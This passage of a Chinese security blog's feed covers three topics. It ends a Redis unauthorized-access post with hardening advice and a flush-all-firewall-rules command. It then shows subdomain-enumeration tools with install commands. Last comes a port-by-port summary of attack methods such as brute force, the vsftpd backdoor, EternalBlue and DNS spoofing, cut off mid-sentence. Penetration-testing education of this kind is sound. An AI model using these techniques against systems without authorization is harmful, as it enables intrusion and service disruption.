另外需要通过主机内置的防火墙如iptables，或者其他外置防火墙禁止非业务主机访问redis服务 </p><p>第二： 设置访问密码 在 redis.conf 中找到“requirepass”字段，取消注释并在后面填上你需要的密码。 注：修改redis的配置需要重启redis才能生效。 </p><p>第三： 使用普通用户启动redis，并且禁止该用户启动shell，禁止使用root用户启动redis。</p><h1 id="0x05-踩坑指南"><a href="#0x05-踩坑指南" class="headerlink" title="0x05 踩坑指南"></a>0x05 踩坑指南</h1><p>使用命令连接出现下面错误</p><p>Could not connect to Redis at 192.168.25.153:6379: No route to host</p><p>问题原因：<br>centos7主机默认开启了防火墙</p><p>解决方法：</p><p>iptables -F –删除所有防火墙规则</p><p>简单粗暴，真实环境中不可这样</p><p>真实环境可参考</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iptables -N REDIS</span><br><span class="line">iptables -A REDIS -s 192.168.10.1 -j ACCEPT</span><br><span class="line">iptables -A REDIS -s 192.168.10.2 -j ACCEPT</span><br><span class="line">iptables -A REDIS -j LOG --log-prefix &quot;unauth-redis-access&quot;</span><br><span class="line">iptables -A REDIS -j REJECT --reject-with icmp-port-unreachable</span><br><span class="line">iptables -I INPUT -p tcp --dport 6379 -j REDIS</span><br></pre></td></tr></table></figure><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://www.cnblogs.com/zuidongfeng/p/8032505.html" target="_blank" rel="noopener">https://www.cnblogs.com/zuidongfeng/p/8032505.html</a></p><p><a href="https://blog.csdn.net/Fly_hps/article/details/80937837" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80937837</a></p><p><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">https://www.freebuf.com/column/158065.html</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在渗透测试的过程中，经常会碰到各种未授权访问漏洞，今天总结一下redis的未授权访问漏洞，从靶机的环境搭建到漏洞复现再到getshell，如有错误的地方，还请各位大佬指出，共同进步。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://www.mad-coding.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="redis" scheme="https://www.mad-coding.cn/tags/redis/"/>
    
      <category term="未授权" scheme="https://www.mad-coding.cn/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>如何挖掘子域名？</title>
    <link href="https://www.mad-coding.cn/2020/01/10/%E5%87%A0%E6%AC%BE%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.mad-coding.cn/2020/01/10/几款子域名挖掘工具的使用/</id>
    <published>2020-01-10T08:57:23.000Z</published>
    <updated>2020-01-13T10:08:10.780Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>子域名挖掘，是信息收集中的一部分，在SRC的漏洞挖掘中非常重要。所以，今天总结一些子域名挖掘的思路和工具。</p><a id="more"></a><h1 id="0x01-被动挖掘"><a href="#0x01-被动挖掘" class="headerlink" title="0x01 被动挖掘"></a>0x01 被动挖掘</h1><p>通过搜索引擎，常见的搜索引擎有百度、谷歌、bing、搜狗、360搜索等。</p><p>搜索语法：</p><blockquote><p>site: xxxx.com</p></blockquote><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200110172303.png" class="lozad"><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200110172354.png" class="lozad"><h1 id="0x02-通过证书透明度"><a href="#0x02-通过证书透明度" class="headerlink" title="0x02 通过证书透明度"></a>0x02 通过证书透明度</h1><h2 id="2-1-什么是证书透明度？"><a href="#2-1-什么是证书透明度？" class="headerlink" title="2.1 什么是证书透明度？"></a>2.1 什么是证书透明度？</h2><p><strong>证书透明度</strong>（英语：<strong>Certificate Transparency</strong>，简称<strong>CT</strong>）也称<strong>证书透明</strong>、<strong>证书透明化</strong>，它是一个实验性的<a href="https://zh.wikipedia.org/wiki/互联网工程任务组" target="_blank" rel="noopener">IETF</a><a href="https://zh.wikipedia.org/wiki/开源标准" target="_blank" rel="noopener">开源标准</a><a href="https://zh.wikipedia.org/wiki/证书透明度#cite_note-rfc6962-1" target="_blank" rel="noopener">[1]</a>和<a href="https://zh.wikipedia.org/wiki/开放源代码" target="_blank" rel="noopener">开源</a><a href="https://zh.wikipedia.org/wiki/軟體框架" target="_blank" rel="noopener">框架</a>，目的是监测和审计<a href="https://zh.wikipedia.org/wiki/電子證書" target="_blank" rel="noopener">数字证书</a>。通过证书日志、监控和审计系统，证书透明度使网站用户和域名持有者可以识别不当或恶意签发的证书，以及识别<a href="https://zh.wikipedia.org/wiki/数字证书认证机构" target="_blank" rel="noopener">数字证书认证机构</a>（CA）的作为。</p><h2 id="2-2-在线网址"><a href="#2-2-在线网址" class="headerlink" title="2.2 在线网址"></a>2.2 在线网址</h2><p><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/   </a>  </p><p><a href="http://censys.io/" target="_blank" rel="noopener">http://censys.io/</a></p><h2 id="2-3-使用案例"><a href="#2-3-使用案例" class="headerlink" title="2.3 使用案例"></a>2.3 使用案例</h2><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200113160222.png" class="lozad"><h1 id="0x03-子域名挖掘工具"><a href="#0x03-子域名挖掘工具" class="headerlink" title="0x03 子域名挖掘工具"></a>0x03 子域名挖掘工具</h1><h2 id="3-1-subDomainsBrute"><a href="#3-1-subDomainsBrute" class="headerlink" title="3.1 subDomainsBrute"></a>3.1 subDomainsBrute</h2><p>本工具用于渗透测试目标域名收集。高并发DNS暴力枚举，发现其他工具无法探测到的域名, 如Google，aizhan，fofa。</p><h3 id="3-1-1-安装"><a href="#3-1-1-安装" class="headerlink" title="3.1.1 安装"></a>3.1.1 安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lijiejie/subDomainsBrute.git</span><br><span class="line">cd subDomainsBrute</span><br><span class="line">pip install dnspython gevent</span><br></pre></td></tr></table></figure><h3 id="3-1-2-使用教程"><a href="#3-1-2-使用教程" class="headerlink" title="3.1.2 使用教程"></a>3.1.2 使用教程</h3><p>语法：</p><blockquote><p>subDomainsBrute.py [options] target.com</p></blockquote><p>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--version#显示版本号</span><br><span class="line">--help#查看帮助信息</span><br><span class="line">-f #加载本地的子域名字典，默认使用的是subnames.txt字典</span><br><span class="line">--full#完全扫描subnames_full.txt </span><br><span class="line">-i#忽略指向私有ip的域</span><br><span class="line">-t#扫描线程，默认是200</span><br><span class="line">-p#扫描进程，默认是6</span><br><span class="line">-o#输出结果，默认是target.txt</span><br></pre></td></tr></table></figure><h3 id="3-3-3-案例演示"><a href="#3-3-3-案例演示" class="headerlink" title="3.3.3 案例演示"></a>3.3.3 案例演示</h3><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200110174313.png" class="lozad"><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200110174356.png" class="lozad"><h2 id="3-2-Gobuster"><a href="#3-2-Gobuster" class="headerlink" title="3.2 Gobuster"></a>3.2 Gobuster</h2><p>Gobuster是用于暴力破解的工具：</p><ul><li>网站中的URI（目录和文件）。</li><li>DNS子域（具有通配符支持）。</li><li>目标Web服务器上的虚拟主机名。</li></ul><h3 id="3-2-1-安装"><a href="#3-2-1-安装" class="headerlink" title="3.2.1 安装"></a>3.2.1 安装</h3><p>先安装go环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">##解压到/usr/local目录</span></span><br><span class="line">tar -C /usr/<span class="built_in">local</span>/ -zxvf go1.8.3.linux-amd64.tar.gz </span><br><span class="line"></span><br><span class="line"><span class="comment">#添加环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:/usr/local/go/bin'</span> &gt;&gt; /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#立即生效环境变量</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看是否安装成功</span></span><br><span class="line">go --version</span><br></pre></td></tr></table></figure><p>直接下载编译好的二进制文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/OJ/gobuster/releases</span><br><span class="line"></span><br><span class="line">7z x gobuster-linux-amd64.7z</span><br><span class="line"></span><br><span class="line">cd gobuster-linux-amd64</span><br><span class="line"></span><br><span class="line">chmod +x gobuster</span><br></pre></td></tr></table></figure><p>cd gobuster</p><p>查看帮助</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200113174918.png" class="lozad"><p>查看相对命令下的子命令</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200113174618.png" class="lozad"><h3 id="3-2-2-使用教程"><a href="#3-2-2-使用教程" class="headerlink" title="3.2.2 使用教程"></a>3.2.2 使用教程</h3><blockquote><p>gobuster -m dns -w subdomains.txt -u baidu.com -i</p></blockquote><p>命令参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  -fw-暴力与通配符域处理的结果。</span><br><span class="line">    -m &lt;mode&gt;-对使用哪个模式，dir或dns（默认：dir)</span><br><span class="line">    -q-标题下划线/禁用输出。</span><br><span class="line">    -t &lt;threads&gt;-运行的线程数（默认：10)。</span><br><span class="line">    -u &lt;url/domain&gt;-完整的URL名称(包括方案)或基本域名。</span><br><span class="line">    -v显示详细输出（-）的所有结果。</span><br><span class="line">    -w &lt;wordlist&gt;-字典的路径使用暴力破解。</span><br><span class="line">==========================================================</span><br><span class="line">命令行选项dns模式</span><br><span class="line">    -cn-CNAME记录显示(不可以使用“-i”选项)。</span><br><span class="line">    -i-显示所有IP地址的结果。</span><br><span class="line">=============================================================</span><br><span class="line">命令行选项dir模式</span><br><span class="line">    -a &lt;user agent string&gt;-指定要发送的用户代理字符串的请求标头中。</span><br><span class="line">    -c &lt;http cookies&gt;-定义任何cookies，您可能需要模拟(AUTH)。</span><br><span class="line">    -e-使扩展模式指定完整的URL。</span><br><span class="line">    -f-附加的目录/暴力。</span><br><span class="line">    -k-跳过验证的SSL证书。</span><br><span class="line">    -l-表示所述长度的响应。</span><br><span class="line">    -n-“无状态”模式，禁用的输出结果的状态代码。</span><br><span class="line">    -o &lt;file&gt;-指定一个文件名，并将输出写到。</span><br><span class="line">    -p &lt;proxy url&gt;-指定要使用的代理方案对于所有请求URL匹配（多方案）。</span><br><span class="line">    -r-遵循重定向”。</span><br><span class="line">    -s &lt;status codes&gt;-逗号分隔的列表的状态代码被认为是“阳性”（默认：200,204,301,302,307)。</span><br><span class="line">    -x &lt;extensions&gt;-扩展的列表来检查，如果有的话)。</span><br><span class="line">    -P &lt;password&gt;-HTTP基本身份验证(仅限授权密码，如果丢失的提示)。</span><br><span class="line">    -U &lt;username&gt;-授权(HTTP基本认证的用户名）。</span><br></pre></td></tr></table></figure><h3 id="3-2-3-案例演示"><a href="#3-2-3-案例演示" class="headerlink" title="3.2.3 案例演示"></a>3.2.3 案例演示</h3><p>爆破百度的子域名</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200113175513.png" class="lozad"><h2 id="3-3-子域名挖掘机"><a href="#3-3-子域名挖掘机" class="headerlink" title="3.3 子域名挖掘机"></a>3.3 子域名挖掘机</h2><h3 id="3-3-1-安装"><a href="#3-3-1-安装" class="headerlink" title="3.3.1 安装"></a>3.3.1 安装</h3><p><a href="https://download.csdn.net/download/milkway2013/12100105" target="_blank" rel="noopener">https://download.csdn.net/download/milkway2013/12100105</a></p><p>下载后直接打开即可。</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200113155941.png" class="lozad"><h3 id="3-3-2-使用教程"><a href="#3-3-2-使用教程" class="headerlink" title="3.3.2 使用教程"></a>3.3.2 使用教程</h3><p>输入一级域名以后，点击启动就可以了，</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200113160137.png" class="lozad"><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;子域名挖掘，是信息收集中的一部分，在SRC的漏洞挖掘中非常重要。所以，今天总结一些子域名挖掘的思路和工具。&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="子域名" scheme="https://www.mad-coding.cn/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>黑客常用端口利用总结</title>
    <link href="https://www.mad-coding.cn/2020/01/03/%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mad-coding.cn/2020/01/03/黑客常用端口利用总结/</id>
    <published>2020-01-03T07:13:45.000Z</published>
    <updated>2020-01-03T07:34:11.265Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>端口就和大门一样，是通往渗透中信息收集必不可少步骤，今天给大家整理一下在渗透中常用的一些端口以及一些端口的漏洞利用方式。</p><a id="more"></a><h1 id="0x01-常用端口预览"><a href="#0x01-常用端口预览" class="headerlink" title="0x01 常用端口预览"></a>0x01 常用端口预览</h1><table><thead><tr><th align="center">端口</th><th align="center">服务</th><th align="center">入侵方式</th></tr></thead><tbody><tr><td align="center">21</td><td align="center">ftp/tftp/vsftpd文件传输协议</td><td align="center">爆破/嗅探/溢出/后门</td></tr><tr><td align="center">22</td><td align="center">ssh远程连接</td><td align="center">爆破/openssh漏洞</td></tr><tr><td align="center">23</td><td align="center">Telnet远程连接</td><td align="center">爆破/嗅探/弱口令</td></tr><tr><td align="center">25</td><td align="center">SMTP邮件服务</td><td align="center">邮件伪造</td></tr><tr><td align="center">53</td><td align="center">DNS域名解析系统</td><td align="center">域传送/劫持/缓存投毒/欺骗</td></tr><tr><td align="center">67/68</td><td align="center">dhcp服务</td><td align="center">劫持/欺骗</td></tr><tr><td align="center">110</td><td align="center">pop3</td><td align="center">爆破/嗅探</td></tr><tr><td align="center">139</td><td align="center">Samba服务</td><td align="center">爆破/未授权访问/远程命令执行</td></tr><tr><td align="center">143</td><td align="center">Imap协议</td><td align="center">爆破</td></tr><tr><td align="center">161</td><td align="center">SNMP协议</td><td align="center">爆破/搜集目标内网信息</td></tr><tr><td align="center">389</td><td align="center">Ldap目录访问协议</td><td align="center">注入/未授权访问/弱口令</td></tr><tr><td align="center">445</td><td align="center">smb</td><td align="center">ms17-010/端口溢出</td></tr><tr><td align="center">512/513/514</td><td align="center">Linux Rexec服务</td><td align="center">爆破/Rlogin登陆</td></tr><tr><td align="center">873</td><td align="center">Rsync服务</td><td align="center">文件上传/未授权访问</td></tr><tr><td align="center">1080</td><td align="center">socket</td><td align="center">爆破</td></tr><tr><td align="center">1352</td><td align="center">Lotus domino邮件服务</td><td align="center">爆破/信息泄漏</td></tr><tr><td align="center">1433</td><td align="center">mssql</td><td align="center">爆破/注入/SA弱口令</td></tr><tr><td align="center">1521</td><td align="center">oracle</td><td align="center">爆破/注入/TNS爆破/反弹shell</td></tr><tr><td align="center">2049</td><td align="center">Nfs服务</td><td align="center">配置不当</td></tr><tr><td align="center">2181</td><td align="center">zookeeper服务</td><td align="center">未授权访问</td></tr><tr><td align="center">2375</td><td align="center">docker remote api</td><td align="center">未授权访问</td></tr><tr><td align="center">3306</td><td align="center">mysql</td><td align="center">爆破/注入</td></tr><tr><td align="center">3389</td><td align="center">Rdp远程桌面链接</td><td align="center">爆破/shift后门</td></tr><tr><td align="center">4848</td><td align="center">GlassFish控制台</td><td align="center">爆破/认证绕过</td></tr><tr><td align="center">5000</td><td align="center">sybase/DB2数据库</td><td align="center">爆破/注入/提权</td></tr><tr><td align="center">5432</td><td align="center">postgresql</td><td align="center">爆破/注入/缓冲区溢出</td></tr><tr><td align="center">5632</td><td align="center">pcanywhere服务</td><td align="center">抓密码/代码执行</td></tr><tr><td align="center">5900</td><td align="center">vnc</td><td align="center">爆破/认证绕过</td></tr><tr><td align="center">6379</td><td align="center">Redis数据库</td><td align="center">未授权访问/爆破</td></tr><tr><td align="center">7001/7002</td><td align="center">weblogic</td><td align="center">java反序列化/控制台弱口令</td></tr><tr><td align="center">80/443</td><td align="center">http/https</td><td align="center">web应用漏洞/心脏滴血</td></tr><tr><td align="center">8069</td><td align="center">zabbix服务</td><td align="center">远程命令执行/注入</td></tr><tr><td align="center">8161</td><td align="center">activemq</td><td align="center">弱口令/写文件</td></tr><tr><td align="center">8080/8089</td><td align="center">Jboss/Tomcat/Resin</td><td align="center">爆破/PUT文件上传/反序列化</td></tr><tr><td align="center">8083/8086</td><td align="center">influxDB</td><td align="center">未授权访问</td></tr><tr><td align="center">9000</td><td align="center">fastcgi</td><td align="center">远程命令执行</td></tr><tr><td align="center">9090</td><td align="center">Websphere控制台</td><td align="center">爆破/java反序列化/弱口令</td></tr><tr><td align="center">9200/9300</td><td align="center">elasticsearch</td><td align="center">远程代码执行</td></tr><tr><td align="center">11211</td><td align="center">memcached</td><td align="center">未授权访问</td></tr><tr><td align="center">27017/27018</td><td align="center">mongodb</td><td align="center">未授权访问/爆破</td></tr></tbody></table><h1 id="0x02-端口渗透剖析"><a href="#0x02-端口渗透剖析" class="headerlink" title="0x02 端口渗透剖析"></a>0x02 端口渗透剖析</h1><h2 id="21端口渗透剖析"><a href="#21端口渗透剖析" class="headerlink" title="21端口渗透剖析"></a><strong>21端口渗透剖析</strong></h2><p>FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。``（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱``（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。（https:``//www.freebuf.com/column/143480.html）``（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。``（5）ftp远程代码溢出。（https:``//blog.csdn.net/weixin_42214273/article/details/82892282）（6）ftp跳转攻击。（https://blog.csdn.net/mgxcool/article/details/48249473）`</span><br></pre></td></tr></table></figure><h2 id="22端口渗透剖析"><a href="#22端口渗透剖析" class="headerlink" title="22端口渗透剖析"></a><strong>22端口渗透剖析</strong></h2><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。``（2）防火墙SSH后门。（https:``//www.secpulse.com/archives/69093.html）``（3）28退格 OpenSSL``（4）openssh 用户枚举 CVE-2018-15473。（https:``//www.anquanke.com/post/id/157607）`</span><br></pre></td></tr></table></figure><h2 id="23端口渗透剖析"><a href="#23端口渗透剖析" class="headerlink" title="23端口渗透剖析"></a><strong>23端口渗透剖析</strong></h2><p>telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。``（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。`</span><br></pre></td></tr></table></figure><h2 id="25-465端口渗透剖析"><a href="#25-465端口渗透剖析" class="headerlink" title="25/465端口渗透剖析"></a><strong>25/465端口渗透剖析</strong></h2><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`默认端口：25（smtp）、465（smtps）``（1）爆破：弱口令``（2）未授权访问`</span><br></pre></td></tr></table></figure><h2 id="53端口渗透剖析"><a href="#53端口渗透剖析" class="headerlink" title="53端口渗透剖析"></a><strong>53端口渗透剖析</strong></h2><p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（https:``//www.seebug.org/vuldb/ssvid-96718）``（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（https:``//baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）``（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（http:``//www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）（4）DNS劫持。（https://blog.csdn.net/qq_32447301/article/details/77542474）`</span><br></pre></td></tr></table></figure><h2 id="80端口渗透剖析"><a href="#80端口渗透剖析" class="headerlink" title="80端口渗透剖析"></a><strong>80端口渗透剖析</strong></h2><p>80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL<a href="http://www.05112.com/" target="_blank" rel="noopener">注入</a>的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。``（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。``（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。``（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。``（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。``（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。``（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。`</span><br></pre></td></tr></table></figure><h2 id="135端口渗透剖析"><a href="#135端口渗透剖析" class="headerlink" title="135端口渗透剖析"></a><strong>135端口渗透剖析</strong></h2><p>135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’<a href="http://www.05112.com/" target="_blank" rel="noopener">病毒</a>就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（https:``//wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）``（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（https:``//wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）`</span><br></pre></td></tr></table></figure><h2 id="139-445端口渗透剖析"><a href="#139-445端口渗透剖析" class="headerlink" title="139/445端口渗透剖析"></a><strong>139/445端口渗透剖析</strong></h2><p>139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（https:``//blog.csdn.net/qq_41880069/article/details/82908131）``（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（https:``//blog.csdn.net/god_7z1/article/details/6773652）``（3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（https:``//blog.warhut.cn/dmbj/145.html）``（4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。`</span><br></pre></td></tr></table></figure><h2 id="1433端口渗透剖析"><a href="#1433端口渗透剖析" class="headerlink" title="1433端口渗透剖析"></a><strong>1433端口渗透剖析</strong></h2><p>1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP/IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（https:``//blog.csdn.net/gxj022/article/details/4593015）``（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（https:``//blog.csdn.net/kali_linux/article/details/50499576）``（3）嗅探技术同样能嗅探到SQL 